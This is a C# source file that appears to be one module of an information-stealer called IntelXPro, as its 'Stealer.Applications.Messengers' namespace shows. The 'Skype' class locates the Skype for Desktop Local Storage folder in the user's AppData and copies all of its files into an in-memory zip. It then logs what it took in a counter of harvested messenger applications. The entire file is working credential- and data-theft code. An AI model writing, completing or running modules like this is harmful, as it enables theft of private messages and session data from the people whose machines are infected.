using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Messengers
{
    internal class Skype : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Skype for Desktop", "Local Storage");
            if (Directory.Exists(text))
            {
                Counter.CounterApplications counterApplications = new Counter.CounterApplications();
                counterApplications.Name = "Skype";
                string text2 = Path.Combine("Skype", "Local Storage");
                zip.AddDirectoryFiles(text, text2);
                counterApplications.Files.Add(text + " => " + text2);
                counterApplications.Files.Add(text2);
                counterApplications.Files.Add("Skype\\");
                counter.Messangers.Add(counterApplications);
            }
        }
    }
}
